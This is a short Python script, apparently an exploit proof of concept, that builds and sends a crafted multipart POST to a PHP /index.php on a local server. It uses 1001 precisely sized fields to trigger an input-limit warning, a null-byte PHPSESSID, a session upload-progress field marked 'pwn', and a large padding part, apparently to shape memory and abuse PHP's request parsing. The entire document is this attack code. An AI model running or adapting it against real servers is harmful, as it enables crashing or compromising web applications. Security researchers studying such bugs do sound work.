#!/usr/bin/env python3
"""A with 1001 fields; among first 1000 registered, NS56 have 31-byte values
(56B strings), the rest 32-byte (64B strings). 1001st triggers warning.
usage: send_a_s56.py NS56 [HUGE] [BNL]
"""
import socket,sys
NS56=int(sys.argv[1]); HUGE=int(sys.argv[2]) if len(sys.argv)>2 else 12; BNL=int(sys.argv[3]) if len(sys.argv)>3 else 17
BND=b'S'*BNL
parts=[]
for i in range(1001):
    vl=31 if i<NS56 else 32
    parts.append({'name':'f%04d'%i,'data':('y' if vl==31 else 'x')*vl})
parts.append({'name':'PHPSESSID','data':b'\x00'})
parts.append({'name':'PHP_SESSION_UPLOAD_PROGRESS','data':b'pwn'})
parts.append({'name':'f','filename':'a.txt','data':b'A'*64})
parts.append({'name':'big','data':b'B'*(HUGE*1024*1024)})
o=bytearray()
for p in parts:
    o+=b'--'+BND+b'\r\n'
    if 'filename' in p:
        o+=b'Content-Disposition: form-data; name="'+p['name'].encode()+b'"; filename="'+p['filename'].encode()+b'"\r\nContent-Type: application/octet-stream\r\n\r\n'
    else:
        o+=b'Content-Disposition: form-data; name="'+p['name'].encode()+b'"\r\n\r\n'
    o+=p['data']+b'\r\n'
o+=b'--'+BND+b'--\r\n'
h=(f'POST /index.php HTTP/1.1\r\nHost: 127.0.0.1:8088\r\nContent-Type: multipart/form-data; boundary={BND.decode()}\r\nContent-Length: {len(o)}\r\nConnection: close\r\n\r\n').encode()
s=socket.create_connection(('127.0.0.1',8088),timeout=30); s.settimeout(30)
try: s.sendall(h+bytes(o))
except OSError: pass
try:
    while s.recv(65536): pass
except OSError: pass
s.close()
